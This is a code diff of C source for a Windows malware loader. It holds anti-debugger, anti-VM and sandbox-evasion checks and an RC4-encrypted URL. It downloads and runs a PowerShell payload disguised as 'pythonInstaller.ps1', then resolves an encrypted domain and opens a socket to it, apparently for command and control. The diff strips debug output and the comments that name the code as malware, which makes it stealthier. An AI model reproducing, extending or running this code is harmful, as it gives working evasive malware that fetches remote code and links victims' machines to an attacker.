@@ -17,22 +17,20 @@ BOOL is_debugger_present() {
 BOOL is_running_in_vm() {
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
-    return (sysInfo.dwNumberOfProcessors <= 2);  // Heuristic: ít core = VM
+    return (sysInfo.dwNumberOfProcessors <= 2);
 }
 
 BOOL is_uptime_suspicious() {
-    DWORD uptime = GetTickCount64() / 1000;  // seconds
-    return (uptime < 300);  // System vừa khởi động < 5 phút?
+    DWORD uptime = GetTickCount64() / 1000;
+    return (uptime < 300);
 }
 
 void suspicious_delay_check() {
     DWORD start = GetTickCount();
-    Sleep(5000);  // ngủ 5s
+    Sleep(5000);
     DWORD elapsed = GetTickCount() - start;
 
     if (elapsed < 4000) {
-        // Nếu sandbox hook Sleep và trả về nhanh
-        printf("[!] Sleep was bypassed - possible sandbox detected!\n");
         ExitProcess(1);
     }
 }
@@ -74,8 +72,6 @@ BOOL DownloadFileFromUrl(const char* url, const char* savePath){
     CloseHandle(hOutput);
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInternet);
-
-    printf("Download complete: %s\n", savePath);
     return TRUE;
 }
 BOOL CreateFolder(const char* folderPath) {
@@ -205,19 +201,14 @@ DWORD base64_decode(char *input, BYTE **output) {
 }
 DWORD base64_encode(const BYTE* input, DWORD input_len, char** output) {
     DWORD encoded_len = 0;
-
-    // Bước 1: Lấy độ dài chuỗi base64 sau encode
     if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encoded_len)) {
         return 0;
     }
-
-    // Bước 2: Cấp phát bộ nhớ
     *output = (char*)malloc(encoded_len);
     if (!*output) {
         return 0;
     }
 
-    // Bước 3: Thực hiện encode
     if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *output, &encoded_len)) {
         free(*output);
         *output = NULL;
@@ -232,7 +223,6 @@ int main() {
     is_debugger_present();
     is_running_in_vm();
     is_uptime_suspicious();
-    // Tạo một folder làm việc của malware
     const char* user = GetCurrentUserNameString();
     char folder[MAX_PATH];
     snprintf(folder, sizeof(folder), "C:\\Users\\%s\\AppData\\Local\\Temp\\kAiZ3n", user);
@@ -247,7 +237,6 @@ int main() {
     BYTE url [114] = {0xc8,0x83,0xbd,0x45,0x49,0xed,0xf1,0x0a,0xb9,0xc1,0x4a,0xb3,0xd3,0xf8,0x66,0x50,0x86,0x9c,0xf5,0x3e,0x5d,0xfb,0x0c,0x67,0x1f,0x6b,0x79,0xe3,0xe7,0xf9,0x9e,0x4f,0x5e,0xa2,0xa3,0x04,0x65,0x8f,0x77,0xab,0x2a,0x93,0x72,0x00,0x7b,0x7b,0xd8,0x02,0xb5,0x60,0x0b,0x8b,0xe9,0x8f,0x04,0x1b,0x29,0xac,0xcb,0x56,0x70,0xdf,0x18,0x52,0xe7,0x11,0x30,0x53,0x13,0x3e,0x46,0x2d,0x88,0x5a,0x86,0x0b,0x97,0x02,0x34,0x5f,0xfe,0x0d,0x45,0xa0,0xcc,0x98,0xbf,0xab,0xee,0xdd,0xc4,0x0a,0xa8,0x6d,0x0f,0x0d,0x1f,0x10,0xf9,0x3c,0x3b,0xde,0xd5,0xd5,0x71,0xbf,0xaa,0x32,0x91,0x99,0xbb,0x71,0x0f,0xee};
     DWORD url_len = 114;
     BYTE decrypted_url[114] = {0};
-    printf("%s", fileName);
     DWORD len_fileName = 13;
     if (!rc4_decrypt(fileName, len_fileName, url, decrypted_url, url_len)) {
         return 1;
@@ -258,7 +247,6 @@ int main() {
     snprintf(outfile,sizeof(outfile),"%s\\pythonInstaller.ps1", folder);
     memcpy(url_str, decrypted_url, 114);
     DownloadFileFromUrl(url_str,outfile);
-    printf("%s", url_str);
     STARTUPINFOA si1 = { 0 };
     PROCESS_INFORMATION pi1 = { 0 };
     si1.cb = sizeof(si1);
@@ -311,11 +299,11 @@ int main() {
     if (!rc4_decrypt(key, key_len, dec_base64_domain, decrypted_domain, decDomain_len)) {
         free(dec_base64_domain);
     }
-    printf("%s",decrypted_domain);
+
     he = gethostbyname((char*)decrypted_domain);
     struct in_addr** addr_list =(struct in_addr**)he->h_addr_list;
     char* ip = inet_ntoa(*addr_list[0]);
-    printf("%s",ip);
+
     srv.sin_family = AF_INET;
     srv.sin_port = htons(PORT);
     srv.sin_addr.s_addr = my_inet_addr(ip);
